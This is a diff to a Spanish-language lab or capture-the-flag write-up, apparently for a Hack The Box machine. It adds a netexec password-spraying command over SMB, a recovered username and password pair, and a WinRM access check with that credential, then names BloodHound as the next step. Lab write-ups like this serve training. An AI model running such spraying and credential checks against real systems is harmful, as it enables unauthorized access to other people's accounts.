@@ -437,7 +437,23 @@ nikk37::n1kk1sd0p3t00:)
 yoshihide::paddpadd@12
 ```
 
+Verificamos sin las contraseñas son validas
+```shell
+nxc smb 10.129.13.82 -u users.txt -p passwords.txt --continue-on-succes
+```
 
+Y validamos 
+```ad-hint
+JDgodd::JDg0dd1s@d0p3cr3@t0r
+```
 
+Verificamos si pertenece al grupo de Remote Management
+```shell
+nxc winrm 10.129.13.82 -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' 
+```
+
+Pero vemos que no pertenece al grupo
+
+Usaremos [[BLOODHOUND]]
 
 
